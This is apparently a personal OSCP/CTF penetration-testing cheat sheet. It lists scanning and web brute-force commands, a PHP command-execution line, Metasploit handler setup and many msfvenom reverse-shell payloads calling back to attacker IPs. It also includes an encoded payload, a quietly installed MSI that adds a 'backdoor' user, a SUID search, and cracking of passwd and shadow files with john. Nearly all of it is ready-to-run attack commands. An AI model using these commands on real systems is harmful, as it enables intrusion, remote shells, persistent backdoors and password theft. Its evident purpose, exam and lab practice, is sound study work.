

# OSCP
OSCP / CTF

ENUM
```bash
#Portscan all Ports
sudo nmap -sS -p- <ip>

#Portscan with Scripts and Fingerprinting
sudo nmap -sS -sV -sC -p22,80,9000 <ip>

#Web Vuln-Scan
nikto -host 192.168.56.205

#Web Enum BruteForce
gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<host>
https://github.com/danielmiessler/SecLists
#big wordlist:
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/dirsearch.txt
gobuster -t 100 dir -w big.txt -u http://<host>
  
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/FUZZ -t 500
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/config/FUZZ -t 500 -mc 200
```

EXPLOIT
```bash
#CVE / Exploit Search
searchsploit <name>
searchsploit -p <id>
cp <path> .

#Fuzzing 
python -c 'print("A" * 5000)' | nc <ip> <port>
  
#php shell command
"<?php system('id'); ?>"

#upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

#MSFVENOM

#MULTIHANDLER
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"

./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

#java
msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war > /home/kali/Desktop/shell.war

#linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf

#windows
msfvenom -p windows/meterpreter/reverse_https LHOST=172.28.23.16 LPORT=443 -e x86/shikata_ga_nai -i 5 -f dll > shellcode.dll

#php
msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.1.43 lport=4050 > /var/www/shell.txt

#python
msfvenom -p python/meterpreter/reverse_tcp LHOST = ANYIP LPORT= ANY PORT R> anyname.py

#c++
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c > meterpreter.c

#msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msiexec /quiet /qn /i C:\evil.msi

#reverse-shell x64 windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=8888 -f c -b \x00\x0a\x0d


```

PRIVESC
```bash
#SUID BINARY
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

#Crack Password with John
unshadow passwd.txt shadow.txt > unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt 
```

ENCODING/DECODING
```bash
#bash urlencode
echo $( php -r "echo urlencode('Start: #1, Zeichen {13/24} Ende();');"; )
#!/bin/bash
echo $( php -r "echo urlencode(\"$1\");"; )
urlencode.sh 'string zum encodieren'
```
  

